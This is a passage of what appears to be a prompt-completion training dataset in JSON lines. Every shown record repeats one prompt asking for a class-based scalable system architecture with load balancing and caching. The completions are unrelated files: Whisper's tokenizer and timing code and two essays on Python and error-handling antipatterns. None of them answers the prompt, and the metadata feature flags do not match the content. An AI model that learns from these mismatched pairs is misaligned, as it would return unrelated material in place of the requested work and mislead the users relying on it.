> 1\n                    and words[1][\"end\"] - words[1][\"start\"] > max_duration\n                ):\n                    boundary = max(words[1][\"end\"] / 2, words[1][\"end\"] - max_duration)\n                    words[0][\"end\"] = words[1][\"start\"] = boundary\n                words[0][\"start\"] = max(0, words[0][\"end\"] - max_duration)\n\n            # prefer the segment-level start timestamp if the first word is too long.\n            if (\n                segment[\"start\"] < words[0][\"end\"]\n                and segment[\"start\"] - 0.5 > words[0][\"start\"]\n            ):\n                words[0][\"start\"] = max(\n                    0, min(words[0][\"end\"] - median_duration, segment[\"start\"])\n                )\n            else:\n                segment[\"start\"] = words[0][\"start\"]\n\n            # prefer the segment-level end timestamp if the last word is too long.\n            if (\n                segment[\"end\"] > words[-1][\"start\"]\n                and segment[\"end\"] + 0.5 < words[-1][\"end\"]\n            ):\n                words[-1][\"end\"] = max(\n                    words[-1][\"start\"] + median_duration, segment[\"end\"]\n                )\n            else:\n                segment[\"end\"] = words[-1][\"end\"]\n\n            last_speech_timestamp = segment[\"end\"]\n\n        segment[\"words\"] = words\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "whisper/timing.py", "language": "python", "complexity": "complex", "star_count": 85533, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 389}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import base64\nimport os\nimport string\nfrom dataclasses import dataclass, field\nfrom functools import cached_property, lru_cache\nfrom typing import Dict, List, Optional, Tuple\n\nimport tiktoken\n\nLANGUAGES = {\n    \"en\": \"english\",\n    \"zh\": \"chinese\",\n    \"de\": \"german\",\n    \"es\": \"spanish\",\n    \"ru\": \"russian\",\n    \"ko\": \"korean\",\n    \"fr\": \"french\",\n    \"ja\": \"japanese\",\n    \"pt\": \"portuguese\",\n    \"tr\": \"turkish\",\n    \"pl\": \"polish\",\n    \"ca\": \"catalan\",\n    \"nl\": \"dutch\",\n    \"ar\": \"arabic\",\n    \"sv\": \"swedish\",\n    \"it\": \"italian\",\n    \"id\": \"indonesian\",\n    \"hi\": \"hindi\",\n    \"fi\": \"finnish\",\n    \"vi\": \"vietnamese\",\n    \"he\": \"hebrew\",\n    \"uk\": \"ukrainian\",\n    \"el\": \"greek\",\n    \"ms\": \"malay\",\n    \"cs\": \"czech\",\n    \"ro\": \"romanian\",\n    \"da\": \"danish\",\n    \"hu\": \"hungarian\",\n    \"ta\": \"tamil\",\n    \"no\": \"norwegian\",\n    \"th\": \"thai\",\n    \"ur\": \"urdu\",\n    \"hr\": \"croatian\",\n    \"bg\": \"bulgarian\",\n    \"lt\": \"lithuanian\",\n    \"la\": \"latin\",\n    \"mi\": \"maori\",\n    \"ml\": \"malayalam\",\n    \"cy\": \"welsh\",\n    \"sk\": \"slovak\",\n    \"te\": \"telugu\",\n    \"fa\": \"persian\",\n    \"lv\": \"latvian\",\n    \"bn\": \"bengali\",\n    \"sr\": \"serbian\",\n    \"az\": \"azerbaijani\",\n    \"sl\": \"slovenian\",\n    \"kn\": \"kannada\",\n    \"et\": \"estonian\",\n    \"mk\": \"macedonian\",\n    \"br\": \"breton\",\n    \"eu\": \"basque\",\n    \"is\": \"icelandic\",\n    \"hy\": \"armenian\",\n    \"ne\": \"nepali\",\n    \"mn\": \"mongolian\",\n    \"bs\": \"bosnian\",\n    \"kk\": \"kazakh\",\n    \"sq\": \"albanian\",\n    \"sw\": \"swahili\",\n    \"gl\": \"galician\",\n    \"mr\": \"marathi\",\n    \"pa\": \"punjabi\",\n    \"si\": \"sinhala\",\n    \"km\": \"khmer\",\n    \"sn\": \"shona\",\n    \"yo\": \"yoruba\",\n    \"so\": \"somali\",\n    \"af\": \"afrikaans\",\n    \"oc\": \"occitan\",\n    \"ka\": \"georgian\",\n    \"be\": \"belarusian\",\n    \"tg\": \"tajik\",\n    \"sd\": \"sindhi\",\n    \"gu\": \"gujarati\",\n    \"am\": \"amharic\",\n    \"yi\": \"yiddish\",\n    \"lo\": \"lao\",\n    \"uz\": \"uzbek\",\n    \"fo\": \"faroese\",\n    \"ht\": \"haitian creole\",\n    \"ps\": \"pashto\",\n    \"tk\": \"turkmen\",\n    \"nn\": \"nynorsk\",\n    \"mt\": \"maltese\",\n    \"sa\": \"sanskrit\",\n    \"lb\": \"luxembourgish\",\n    \"my\": \"myanmar\",\n    \"bo\": \"tibetan\",\n    \"tl\": \"tagalog\",\n    \"mg\": \"malagasy\",\n    \"as\": \"assamese\",\n    \"tt\": \"tatar\",\n    \"haw\": \"hawaiian\",\n    \"ln\": \"lingala\",\n    \"ha\": \"hausa\",\n    \"ba\": \"bashkir\",\n    \"jw\": \"javanese\",\n    \"su\": \"sundanese\",\n    \"yue\": \"cantonese\",\n}\n\n# language code lookup by name, with a few language aliases\nTO_LANGUAGE_CODE = {\n    **{language: code for code, language in LANGUAGES.items()},\n    \"burmese\": \"my\",\n    \"valencian\": \"ca\",\n    \"flemish\": \"nl\",\n    \"haitian\": \"ht\",\n    \"letzeburgesch\": \"lb\",\n    \"pushto\": \"ps\",\n    \"panjabi\": \"pa\",\n    \"moldavian\": \"ro\",\n    \"moldovan\": \"ro\",\n    \"sinhalese\": \"si\",\n    \"castilian\": \"es\",\n    \"mandarin\": \"zh\",\n}\n\n\n@dataclass\nclass Tokenizer:\n    \"\"\"A thin wrapper around `tiktoken` providing quick access to special tokens\"\"\"\n\n    encoding: tiktoken.Encoding\n    num_languages: int\n    language: Optional[str] = None\n    task: Optional[str] = None\n    sot_sequence: Tuple[int] = ()\n    special_tokens: Dict[str, int] = field(default_factory=dict)\n\n    def __post_init__(self):\n        for special in self.encoding.special_tokens_set:\n            special_token = self.encoding.encode_single_token(special)\n            self.special_tokens[special] = special_token\n\n        sot: int = self.special_tokens[\"<|startoftranscript|>\"]\n        translate: int = self.special_tokens[\"<|translate|>\"]\n        transcribe: int = self.special_tokens[\"<|transcribe|>\"]\n\n        langs = tuple(LANGUAGES.keys())[: self.num_languages]\n        sot_sequence = [sot]\n        if self.language is not None:\n            sot_sequence.append(sot + 1 + langs.index(self.language))\n        if self.task is not None:\n            task_token: int = transcribe if self.task == \"transcribe\" else translate\n            sot_sequence.append(task_token)\n\n        self.sot_sequence = tuple(sot_sequence)\n\n    def encode(self, text, **kwargs):\n        return self.encoding.encode(text, **kwargs)\n\n    def decode(self, token_ids: List[int], **kwargs) -> str:\n        token_ids = [t for t in token_ids if t < self.timestamp_begin]\n        return self.encoding.decode(token_ids, **kwargs)\n\n    def decode_with_timestamps(self, token_ids: List[int], **kwargs) -> str:\n        \"\"\"\n        Timestamp tokens are above other special tokens' id range and are ignored by `decode()`.\n        This method decodes given tokens with timestamps tokens annotated, e.g. \"<|1.08|>\".\n        \"\"\"\n        return self.encoding.decode(token_ids, **kwargs)\n\n    @cached_property\n    def eot(self) -> int:\n        return self.encoding.eot_token\n\n    @cached_property\n    def transcribe(self) -> int:\n        return self.special_tokens[\"<|transcribe|>\"]\n\n    @cached_property\n    def translate(self) -> int:\n        return self.special_tokens[\"<|translate|>\"]\n\n    @cached_property\n    def sot(self) -> int:\n        return self.special_tokens[\"<|startoftranscript|>\"]\n\n    @cached_property\n    def sot_lm(self) -> int:\n        return self.special_tokens[\"<|startoflm|>\"]\n\n    @cached_property\n    def sot_prev(self) -> int:\n        return self.special_tokens[\"<|startofprev|>\"]\n\n    @cached_property\n    def no_speech(self) -> int:\n        return self.special_tokens[\"<|nospeech|>\"]\n\n    @cached_property\n    def no_timestamps(self) -> int:\n        return self.special_tokens[\"<|notimestamps|>\"]\n\n    @cached_property\n    def timestamp_begin(self) -> int:\n        return self.special_tokens[\"<|0.00|>\"]\n\n    @cached_property\n    def language_token(self) -> int:\n        \"\"\"Returns the token id corresponding to the value of the `language` field\"\"\"\n        if self.language is None:\n            raise ValueError(\"This tokenizer does not have language token configured\")\n\n        return self.to_language_token(self.language)\n\n    def to_language_token(self, language):\n        if token := self.special_tokens.get(f\"<|{language}|>\", None):\n            return token\n\n        raise KeyError(f\"Language {language} not found in tokenizer.\")\n\n    @cached_property\n    def all_language_tokens(self) -> Tuple[int]:\n        result = []\n        for token, token_id in self.special_tokens.items():\n            if token.strip(\"<|>\") in LANGUAGES:\n                result.append(token_id)\n        return tuple(result)[: self.num_languages]\n\n    @cached_property\n    def all_language_codes(self) -> Tuple[str]:\n        return tuple(self.decode([_l]).strip(\"<|>\") for _l in self.all_language_tokens)\n\n    @cached_property\n    def sot_sequence_including_notimestamps(self) -> Tuple[int]:\n        return tuple(list(self.sot_sequence) + [self.no_timestamps])\n\n    @cached_property\n    def non_speech_tokens(self) -> Tuple[int]:\n        \"\"\"\n        Returns the list of tokens to suppress in order to avoid any speaker tags or non-speech\n        annotations, to prevent sampling texts that are not actually spoken in the audio, e.g.\n\n        - ♪♪♪\n        - ( SPEAKING FOREIGN LANGUAGE )\n        - [DAVID] Hey there,\n\n        keeping basic punctuations like commas, periods, question marks, exclamation points, etc.\n        \"\"\"\n        symbols = list('\"#()*+/:;<=>@[\\\\]^_`{|}~「」『』')\n        symbols += (\n            \"<< >> <<< >>> -- --- -( -[ (' (\\\" (( )) ((( ))) [[ ]] {{ }} ♪♪ ♪♪♪\".split()\n        )\n\n        # symbols that may be a single token or multiple tokens depending on the tokenizer.\n        # In case they're multiple tokens, suppress the first token, which is safe because:\n        # These are between U+2640 and U+267F miscellaneous symbols that are okay to suppress\n        # in generations, and in the 3-byte UTF-8 representation they share the first two bytes.\n        miscellaneous = set(\"♩♪♫♬♭♮♯\")\n        assert all(0x2640 <= ord(c) <= 0x267F for c in miscellaneous)\n\n        # allow hyphens \"-\" and single quotes \"'\" between words, but not at the beginning of a word\n        result = {self.encoding.encode(\" -\")[0], self.encoding.encode(\" '\")[0]}\n        for symbol in symbols + list(miscellaneous):\n            for tokens in [\n                self.encoding.encode(symbol),\n                self.encoding.encode(\" \" + symbol),\n            ]:\n                if len(tokens) == 1 or symbol in miscellaneous:\n                    result.add(tokens[0])\n\n        return tuple(sorted(result))\n\n    def split_to_word_tokens(self, tokens: List[int]):\n        if self.language in {\"zh\", \"ja\", \"th\", \"lo\", \"my\", \"yue\"}:\n            # These languages don't typically use spaces, so it is difficult to split words\n            # without morpheme analysis. Here, we instead split words at any\n            # position where the tokens are decoded as valid unicode points\n            return self.split_tokens_on_unicode(tokens)\n\n        return self.split_tokens_on_spaces(tokens)\n\n    def split_tokens_on_unicode(self, tokens: List[int]):\n        decoded_full = self.decode_with_timestamps(tokens)\n        replacement_char = \"\\ufffd\"\n\n        words = []\n        word_tokens = []\n        current_tokens = []\n        unicode_offset = 0\n\n        for token in tokens:\n            current_tokens.append(token)\n            decoded = self.decode_with_timestamps(current_tokens)\n\n            if (\n                replacement_char not in decoded\n                or decoded_full[unicode_offset + decoded.index(replacement_char)]\n                == replacement_char\n            ):\n                words.append(decoded)\n                word_tokens.append(current_tokens)\n                current_tokens = []\n                unicode_offset += len(decoded)\n\n        return words, word_tokens\n\n    def split_tokens_on_spaces(self, tokens: List[int]):\n        subwords, subword_tokens_list = self.split_tokens_on_unicode(tokens)\n        words = []\n        word_tokens = []\n\n        for subword, subword_tokens in zip(subwords, subword_tokens_list):\n            special = subword_tokens[0] >= self.eot\n            with_space = subword.startswith(\" \")\n            punctuation = subword.strip() in string.punctuation\n            if special or with_space or punctuation or len(words) == 0:\n                words.append(subword)\n                word_tokens.append(subword_tokens)\n            else:\n                words[-1] = words[-1] + subword\n                word_tokens[-1].extend(subword_tokens)\n\n        return words, word_tokens\n\n\n@lru_cache(maxsize=None)\ndef get_encoding(name: str = \"gpt2\", num_languages: int = 99):\n    vocab_path = os.path.join(os.path.dirname(__file__), \"assets\", f\"{name}.tiktoken\")\n    ranks = {\n        base64.b64decode(token): int(rank)\n        for token, rank in (line.split() for line in open(vocab_path) if line)\n    }\n    n_vocab = len(ranks)\n    special_tokens = {}\n\n    specials = [\n        \"<|endoftext|>\",\n        \"<|startoftranscript|>\",\n        *[f\"<|{lang}|>\" for lang in list(LANGUAGES.keys())[:num_languages]],\n        \"<|translate|>\",\n        \"<|transcribe|>\",\n        \"<|startoflm|>\",\n        \"<|startofprev|>\",\n        \"<|nospeech|>\",\n        \"<|notimestamps|>\",\n        *[f\"<|{i * 0.02:.2f}|>\" for i in range(1501)],\n    ]\n\n    for token in specials:\n        special_tokens[token] = n_vocab\n        n_vocab += 1\n\n    return tiktoken.Encoding(\n        name=os.path.basename(vocab_path),\n        explicit_n_vocab=n_vocab,\n        pat_str=r\"\"\"'s|'t|'re|'ve|'m|'ll|'d| ?\\p{L}+| ?\\p{N}+| ?[^\\s\\p{L}\\p{N}]+|\\s+(?!\\S)|\\s+\"\"\",\n        mergeable_ranks=ranks,\n        special_tokens=special_tokens,\n    )\n\n\n@lru_cache(maxsize=None)\ndef get_tokenizer(\n    multilingual: bool,\n    *,\n    num_languages: int = 99,\n    language: Optional[str] = None,\n    task: Optional[str] = None,  # Literal[\"transcribe\", \"translate\", None]\n) -> Tokenizer:\n    if language is not None:\n        language = language.lower()\n        if language not in LANGUAGES:\n            if language in TO_LANGUAGE_CODE:\n                language = TO_LANGUAGE_CODE[language]\n            else:\n                raise ValueError(f\"Unsupported language: {language}\")\n\n    if multilingual:\n        encoding_name = \"multilingual\"\n        language = language or \"en\"\n        task = task or \"transcribe\"\n    else:\n        encoding_name = \"gpt2\"\n        language = None\n        task = None\n\n    encoding = get_encoding(name=encoding_name, num_languages=num_languages)\n\n    return Tokenizer(\n        encoding=encoding, num_languages=num_languages, language=language, task=task\n    )\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "whisper/tokenizer.py", "language": "python", "complexity": "complex", "star_count": 85533, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 396}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<!-- START doctoc generated TOC please keep comment here to allow auto update -->\n<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->\n## Table of Contents\n\n- [Antipatterns](#antipatterns)\n  - [Strict email validation](#strict-email-validation)\n  - [Late returns](#late-returns)\n  - [Hacks comment](#hacks-comment)\n  - [Repeating arguments in function name](#repeating-arguments-in-function-name)\n  - [Repeating class name in method name](#repeating-class-name-in-method-name)\n  - [Repeating function name in docstring](#repeating-function-name-in-docstring)\n  - [Unreadable response construction](#unreadable-response-construction)\n  - [Undeterministic tests](#undeterministic-tests)\n  - [Unbalanced boilerplate](#unbalanced-boilerplate)\n  - [Inconsistent use of verbs in functions](#inconsistent-use-of-verbs-in-functions)\n  - [Opaque function arguments](#opaque-function-arguments)\n  - [Hiding formatting](#hiding-formatting)\n  - [Returning nothing instead of raising NotFound exception](#returning-nothing-instead-of-raising-notfound-exception)\n  - [Having a library that contains all utils](#having-a-library-that-contains-all-utils)\n\n<!-- END doctoc generated TOC please keep comment here to allow auto update -->\n\n# Antipatterns\n\nMost of those are antipatterns in the Python programming language, but some of\nthem might be more generic.\n\n## Strict email validation\n\nIt is almost impossible to strictly validate an email. Even if you were writing\nor using a regex that follows\n[RFC5322](http://tools.ietf.org/html/rfc5322#section-3.4), you would have false\npositives when trying to validate actual emails that don't follow the RFC.\n\nWhat's more, validating an email provides very weak guarantees. A stronger,\nmore meaningful validation would be to send an email and validate that the user\nreceived it.\n\nTo sum up, don't waste your time trying to validate an email if you don't need\nto (or just check that there's a `@` in it). If you need to, send an email with\na token and validate that the user received it.\n\n## Late returns\n\nReturning early reduces cognitive overhead, and improve readability by killing\nindentation levels.\n\nBad:\n\n```python\ndef toast(bread):\n    if bread.kind != 'brioche':\n        if not bread.is_stale:\n            toaster.toast(bread)\n```\n\nGood:\n\n```python\ndef toast(bread):\n    if bread.kind == 'brioche' or bread.is_stale:\n        return\n\n    toaster.toast(bread)\n```\n\n## Hacks comment\n\nBad:\n\n```python\n# Gigantic hack (written by Louis de Funes) 04-01-2015\ntoaster.restart()\n```\n\nThere's multiple things wrong with this comment:\n\n- Even if it is actually a hack, no need to say it in a comment. It lowers the\n  perceived quality of a codebase and impacts developer motivation.\n- Putting the author and the date is totally useless when using source control\n  (`git blame`).\n- This does not explain why it's temporary.\n- It's impossible to easily grep for temporary fixes.\n- [Louis de Funès](https://en.wikipedia.org/wiki/Louis_de_Fun%C3%A8s) would never\n  write a hack.\n\nGood:\n\n```python\n# Need to restart toaster to prevent burning bread\n# TODO: replace with proper fix\ntoaster.restart()\n```\n\n- This clearly explains the nature of the temporary fix.\n- Using `TODO` is an ubiquitous pattern that allows easy grepping and plays\n  nice with most text editors.\n- The perceived quality of this temporary fix is much higher.\n\n## Repeating arguments in function name\n\nBad:\n\n```python\ndef get_by_color(color):\n    return Toasters.filter_by(color=color)\n```\n\nPutting the argument name in both the function name and in arguments is, in\nmost cases and for most interpreted languages, redundant.\n\nGood:\n\n```python\ndef get(color=None):\n    if color:\n        return Toasters.filter_by(color=color)\n```\n\n## Repeating class name in method name\n\nBad:\n\n```python\nclass Toasters(object):\n    def get_toaster(self, toaster_id):\n        pass\n```\n\nThis is bad because it's unnecessarily redundant (`Toasters.get_toaster(1)`). According to the single responsibility principle, a class should focus on one area of responsibility. So the `Toasters` class should only focus on toasters object.\n\nGood:\n\n```python\nclass Toasters(object):\n    def get(self, toaster_id):\n        pass\n```\n\nWhich produces much more concise code:\n\n```\ntoaster = Toasters.get(1)\n```\n\n## Repeating function name in docstring\n\nBad:\n\n```python\ndef test_return_true_if_toast_is_valid():\n    \"\"\"Verify that we return true if toast is valid.\"\"\"\n    assert is_valid(Toast('brioche')) is true\n```\n\nWhy is it bad?\n\n- The docstring and function name are not DRY.\n- There's no actual explanation of what valid means.\n\nGood:\n\n```python\ndef test_valid_toast():\n    \"\"\"Verify that 'brioche' are valid toasts.\"\"\"\n    assert is_valid(Toast('brioche')) is true\n```\n\nOr, another variation:\n\n```python\ndef test_brioche_are_valid_toast():\n    assert is_valid(Toast('brioche')) is true\n```\n\n## Unreadable response construction\n\nTODO\n\nBad:\n\n```python\ndef get_data():\n    returned = {}\n    if stuff:\n        returned['toaster'] = 'toaster'\n    if other_stuff:\n        if the_other_stuff:\n            returned['toast'] = 'brioche'\n    else:\n        returned['toast'] = 'bread'\n    return returned\n```\n\nGood:\n\n```python\ndef get_data():\n    returned = {\n        'toaster': '',\n        'toast': '',\n    }\n```\n\n## Undeterministic tests\n\nWhen testing function that don't behave deterministically, it can be tempting\nto run them multiple time and average their results.\n\nBad:\n\n```python\ndef function():\n    if random.random() > .4:\n        return True\n    else:\n        return False\n\n\ndef test_function():\n    number_of_true = 0\n    for _ in xrange(1000):\n        returned = function()\n        if returned:\n            number_of_true += 1\n\n    assert 30 < number_of_true < 50\n```\n\nThere are multiple things that are wrong with this approach:\n\n- This is a flaky test. Theoretically, this test could still fail.\n- This example is simple enough, but `function` might be doing some\n  computationally expensive task, which would make this test severely\n  inefficient.\n- The test is quite difficult to understand.\n\nGood:\n\n```python\n@mock.patch('random.random')\ndef test_function(mock_random):\n    mock_random.return_value = 0.7\n    assert function() is True\n```\n\nThis is a deterministic test that clearly tells what's going on.\n\n## Unbalanced boilerplate\n\nOne thing to strive for in libraries is have as little boilerplate as possible,\nbut not less.\n\nNot enough boilerplate: you'll spend hours trying to understand specific\nbehaviors that are too magical/implicit. You will need flexibility and you\nwon't be able to get it. Boilerplate is useful insofar as it increases\n[transparency](http://www.catb.org/esr/writings/taoup/html/ch01s06.html).\n\nToo much boilerplate: users of your library will be stuck using outdated\npatterns. Users will write library to generate the boilerplate required by your\nlibrary.\n\nI think Flask and SQLAlchemy do a very good job at keeping this under control.\n\n## Inconsistent use of verbs in functions\n\nBad:\n\n```python\ndef get_toasters(color):\n    \"\"\"Get a bunch of toasters.\"\"\"\n    return filter(lambda toaster: toaster.color == color, TOASTERS)\n\n\ndef find_toaster(id_):\n    \"\"\"Return a single toaster.\"\"\"\n    toasters = filter(lambda toaster: toaster.id == id_, TOASTERS)\n    assert len(toasters) == 1\n    return toasters[1]\n\n\ndef find_toasts(color):\n    \"\"\"Find a bunch of toasts.\"\"\"\n    return filter(lambda toast: toast.color == color, TOASTS)\n```\n\nThe use of verb is inconsistent in this example. `get` is used to return\na possibly empty list of toasters, and `find` is used to return a single\ntoaster (or raise an exception) in the second function or a possibly empty list\nof toasts in the third function.\n\nThis is based on personal taste but I have the following rule:\n\n- `get` prefixes function that return at most one object (they either return\n  none or raise an exception depending on the cases)\n- `find` prefixes function that return a possibly empty list (or iterable) of\n  objects.\n\nGood:\n\n```python\ndef find_toasters(color):\n    \"\"\"Find a bunch of toasters.\"\"\"\n    return filter(lambda toaster: toaster.color == color, TOASTERS)\n\n\ndef get_toaster(id_):\n    \"\"\"Return a single toaster.\"\"\"\n    toasters = filter(lambda toaster: toaster.id == id_, TOASTERS)\n    assert len(toasters) == 1\n    return toasters[1]\n\n\ndef find_toasts(color):\n    \"\"\"Find a bunch of toasts.\"\"\"\n    return filter(lambda toast: toast.color == color, TOASTS)\n```\n\n## Opaque function arguments\n\nA few variants of what I consider code that is difficult to debug:\n\n```python\ndef create(toaster_params):\n    name = toaster_params['name']\n    color = toaster_params.get('color', 'red')\n\n\nclass Toaster(object):\n\n    def __init__(self, params):\n        self.name = params['name']\n\n\n# Probably the worst of all\ndef create2(*args, **kwargs):\n    name = kwargs['name']\n```\n\nWhy is this bad?\n\n- It's really easy to make a mistake, especially in interpreted languages such\n  as Python. For instance, if I call `create({'name': 'hello', 'ccolor': 'blue'})`, I won't get any error, but the color won't be the one I expect.\n- It increases cognitive load, as I have to understand where the object is\n  coming from to introspect its content.\n- It makes the job of static analyzer harder or impossible.\n\nGranted, this pattern is sometimes required (for instance when the number of\nparams is too large, or when dealing with pure data).\n\nA better way is to be explicit:\n\n```python\ndef create(name, color='red'):\n    pass  # ...\n```\n\n## Hiding formatting\n\nBad:\n\n```python\n# main.py\n\nfrom utils import format_query\n\n\ndef get_user(user_id):\n    url = get_url(user_id)\n    return requests.get(url)\n\n\n# utils.py\n\n\ndef get_url(user_id):\n    return 'http://127.0.0.1/users/%s' % user_id\n```\n\nI consider this an antipattern because it hides the request formatting from the developer, making it more complex to see what `url` look like. In this extreme example, the formatting function is a one-liner which sounds a bit overkill for\na function.\n\nGood:\n\n```python\ndef get_user(user_id):\n    url = 'http://127.0.0.1/users/%s' % user_id\n    return requests.get(url)\n```\n\nEven if you were duplicating the logic once or twice it might still be fine, because:\n\n- You're unlikely to re-use anywhere else outside this file.\n- Putting this inline makes it easier for follow the flow. Code is written to be read primarily by computers.\n\n## Returning nothing instead of raising NotFound exception\n\nBad in certain cases:\n\n```python\ndef get_toaster(toaster_id):\n    try:\n        return do_get_toaster(toaster_id)\n    except NotFound:\n        return None\n\n\ndef toast(toaster_id):\n    toaster = get_toaster(toaster_id)\n    ...\n    toaster.toast(\"brioche\")\n```\n\nIt all depends on the caller, but in this cases I'd argue that it is bad practice to return nothing when the toaster identified by `toaster_id` can't be found, for two main reasons.\n\n**First reason**: when we provide an identifier, we expect it to return something. Once again, this depends on the caller (for instance, we could try to see if a user exists by checking an email for instance). In this simple example it's ok because the `toaster.toast()` will fail immediately, but what if we were never calling it and creating some other unrelated objects? We would be doing things that we should never be doing if the object did not exist:\n\n```python\ndef toast(toaster_id, user):\n    toaster = get_toaster(toaster_id)\n    # We should never do this! The toaster might not even exists.\n    send_welcome_email(user)\n    bill_new_toaster(user)\n```\n\n**Second reason**: `toaster.toast` will fail anyway if `toaster` is none (in Python with `AttributeError: NoneType has no attribute toast`). In this abstract example it's ok because the two lines are next to each other, but the actual `toaster.toast()` call might happen further down the stack - and it will be very difficult for the developer to understand where the error is coming from.\n\n```python\ndef toast(toaster_id, user):\n    toaster = get_toaster(toaster_id)\n    do_stuff_a(toaster)\n\n\ndef do_stuff_a(toaster):\n    ...\n    do_stuff_b(toaster)\n    ...\n\n\ndef do_stuff_b(toaster):\n    # Here is the actual call where toaster is called - but we should\n    # have failed early if it's not there.\n    toaster.toast()\n```\n\nWhat's the correct things to do?\n\n- If you expect the object to be there, make sure to raise if you don't find it.\n- If you're using SQLAlchemy, use `one()` to force raising an exception if the object can't be found. Don't use `first` or `one_or_none()`.\n\n## Having a library that contains all utils\n\nBad:\n\n```python\ndef get_current_date():\n    ...\n\n\ndef create_csv(...):\n    ...\n\n\ndef upload_to_sftp(...):\n    ...\n```\n\n`util` or `tools` or `lib` modules that contain all sorts of utilities have a tendency to become bloated and unmaintainable. Prefer to have small, dedicated files.\n\nThis will keep your imports logical (`lib.date_utils`, `lib.csv_utils`, `lib.sftp`), make it easier for the reader to identify all the utilities around a specific topic, and test files easy to keep organized.\n", "metadata": {"source": "github.com/charlax/professional-programming", "file_path": "antipatterns/code-antipatterns.md", "language": "markdown", "complexity": "complex", "star_count": 47841, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": true, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 471}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<!-- START doctoc generated TOC please keep comment here to allow auto update -->\n<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->\n## Table of Contents\n\n- [Error handling anti-patterns](#error-handling-anti-patterns)\n  - [Hiding exceptions](#hiding-exceptions)\n  - [Raising unrelated/unspecific exception](#raising-unrelatedunspecific-exception)\n  - [Unconstrained defensive programming](#unconstrained-defensive-programming)\n  - [Unnecessarily catching and re-raising exceptions](#unnecessarily-catching-and-re-raising-exceptions)\n\n<!-- END doctoc generated TOC please keep comment here to allow auto update -->\n\n# Error handling anti-patterns\n\n## Hiding exceptions\n\nThere are multiple variations of this anti-pattern:\n\n```python\n# Silence all exceptions\ndef toast(bread):\n    try:\n        toaster = Toaster()\n        toaster.insert(bread)\n        toaster.toast()\n    except:\n        pass\n\n\n# Silence some exceptions\ndef toast(bread):\n    try:\n        toaster = Toaster()\n        toaster.insert(bread)\n        toaster.toast()\n    except ValueError:\n        pass\n```\n\nIt depends on the context but in most cases this is a bad pattern:\n\n- **Debugging** those silent errors will be really difficult, because they won't show up in logs and exception reporting tool such as Sentry. Say you have an undefined variable in `Toaster.insert()`: it will raise `NameError`, which will be caught, and ignored, and you will never know about this developer error.\n- **The user experience** will randomly degrade without anybody knowing about it, including the user.\n- **Identifying** those errors will be impossible. Say `do_stuff` does an HTTP request to another service, and that service starts misbehaving. There won't be any exception, any metric that will let you identify it.\n\nAn article even named this [the most diabolical Python antipattern](https://realpython.com/blog/python/the-most-diabolical-python-antipattern/).\n\nThe following full example:\n\n```python\nfrom collections import namedtuple\n\nBread = namedtuple('Bread', 'color')\n\nclass ToastException(Exception):\n    pass\n\ndef toast(bread):\n    try:\n        put_in_toaster(bread)\n    except:\n        raise ToastException('Could not toast bread')\n\n\ndef put_in_toaster(bread):\n    brad.color = 'light_brown'  # Note the typo\n\n\ntoast(Bread('yellow'))\n```\n\nWill raise this cryptic and impossible to debug error:\n\n```\nTraceback (most recent call last):\n  File \"python-examples/reraise_exceptions.py\", line 19, in <module>\n    toast(Bread('yellow'))\n  File \"python-examples/reraise_exceptions.py\", line 12, in toast\n    raise ToastException('Could not toast bread')\n__main__.ToastException: Could not toast bread\n```\n\nSometime it's tempting to think that graceful degradation is about silencing\nexception. It's not.\n\n- Graceful degradation needs to happen at the **highest level** of the code, so that the user can get a very explicit error message (e.g. \"we're having issues with X, please retry in a moment\"). That requires knowing that there was an error, which you can't tell if you're silencing the exception.\n- You need to know when graceful degradation happens. You also need to be\n  alerted if it happens too often. This requires adding monitoring (using\n  something like statsd) and logging (Python's `logger.exception` automatically\n  adds the exception stacktrace to the log message for instance). Silencing an\n  exception won't make the error go away: all things being equal, it's better\n  for something to break hard, than for an error to be silenced.\n- It is tempting to confound silencing the exception and fixing the exception. Say you're getting sporadic timeouts from a service. You might thing: let's ignore those timeouts and just do something else, like return an empty response. But this is very different from (1) actually finding the root cause for those timeouts (e.g. maybe a specific edge cases impacting certain objects) (2) doing proper graceful degradation (e.g. asking users to retry later because the request failed).\n\nIn other words, ask yourself: would it be a problem if every single action was failing? If you're silencing the error, how would you know it's happening for every single action?\n\nHere's a number a better ways to do this:\n\n**Log and create metrics**\n\n```python\nimport statsd\n\n\ndef toast(bread):\n    # Note: no exception handling here.\n    toaster = Toaster()\n    toaster.insert(bread)\n    toaster.toast()\n\n\ndef main():\n    try:\n        toast('brioche')\n    except:\n        logger.exception('Could not toast bread')\n        statsd.count('toast.error', 1)\n```\n\n**Very important**: adding logging and metrics won't not sufficient if it's difficult 